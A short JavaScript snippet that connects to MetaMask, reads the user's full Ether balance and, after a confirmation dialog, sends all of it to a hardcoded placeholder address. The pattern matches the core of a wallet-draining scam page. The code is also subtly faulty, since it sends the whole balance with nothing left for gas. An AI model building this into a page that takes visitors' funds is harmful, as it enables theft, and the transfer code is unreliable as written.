const Web3 = require('web3');

// Check if MetaMask is installed
if (typeof window.ethereum !== 'undefined') {
  const web3 = new Web3(window.ethereum);

  // Request access to the user's MetaMask account
  window.ethereum
    .request({ method: 'eth_requestAccounts' })
    .then(async (accounts) => {
      const senderAddress = accounts[0]; // Get the user's Ethereum address

      // Get the user's balance in Wei
      const balanceWei = await web3.eth.getBalance(senderAddress);

      // Convert Wei to Ether
      const balanceEther = web3.utils.fromWei(balanceWei, 'ether');

      // Define the recipient's address
      const recipientAddress = '0xRECIPIENTADDRESS'; // Replace with the recipient's address

      // Check if the user has a positive balance
      if (balanceEther > 0) {
        // Confirm with the user
        const confirmTransfer = confirm(`Do you want to send ${balanceEther} Ether to ${recipientAddress}?`);

        if (confirmTransfer) {
          // Send all the Ether to the recipient
          const tx = await web3.eth.sendTransaction({
            from: senderAddress,
            to: recipientAddress,
            value: balanceWei,
          });

          console.log('Transaction hash:', tx.transactionHash);
        } else {
          console.log('Transfer canceled by the user.');
        }
      } else {
        console.log('No Ether to transfer.');
      }
    })
    .catch((error) => {
      console.error('Error connecting to MetaMask:', error);
    });
} else {
  console.error('MetaMask not detected. Please install MetaMask and connect to your wallet.');
}
